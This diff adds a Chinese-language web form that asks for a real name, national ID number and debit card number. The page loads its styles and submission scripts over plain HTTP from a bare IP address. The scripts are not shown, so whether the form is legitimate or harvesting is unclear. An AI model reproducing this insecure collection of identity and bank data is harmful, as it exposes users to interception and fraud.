@@ -1,0 +1,46 @@
+﻿<!DOCTYPE html>
+
+<head>
+	<meta charset="UTF-8">	 
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<title></title>
+
+	<link rel="stylesheet" type="text/css" href="http://47.104.90.227/css/identification.css?12" />
+
+</head>
+
+<body>
+	<div class="Mask" id="Mask">
+		<div class="Prompt">
+			<div class="PromptCon">
+				<img src="http://47.104.90.227/image/icon/sb-jupai@2x.png" id="PromptImg" class="PromptImg" />
+				<p id="cue" class="cue"></p>
+				<button class="confirm" onclick="$('#Mask').hide()">确定</button>
+			</div>
+		</div>
+	</div>
+
+	<div class="loding" id="loding">
+		<img class="lodimg" src="http://47.104.90.227/image/icon/loding.gif" />
+		<p style="font-size: 4rem;color: white;margin-top: 3rem;">正在提交</p>
+	</div>
+
+	<div class="rz">
+		<span>真实姓名</span><input type="text" id="UserName" value="" placeholder="请输入" />
+	</div>
+	<div class="rz">
+		<span>身份证号</span><input type="text" id="idcard" value="" placeholder="请输入" />
+	</div>
+	<div class="rz">
+		<span>储蓄卡号</span><input type="number" id="cardNumber" value="" placeholder="请输入" />
+	</div>
+
+	<button class="get" type="button" onclick="getbtn()">提交</button>
+
+</body>
+
+</html>
+
+<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+<script src="http://47.104.90.227/js/base.js?14" type="text/javascript" charset="utf-8"></script>
+<script src="http://47.104.90.227/js/identification.js?14" type="text/javascript" charset="utf-8"></script>
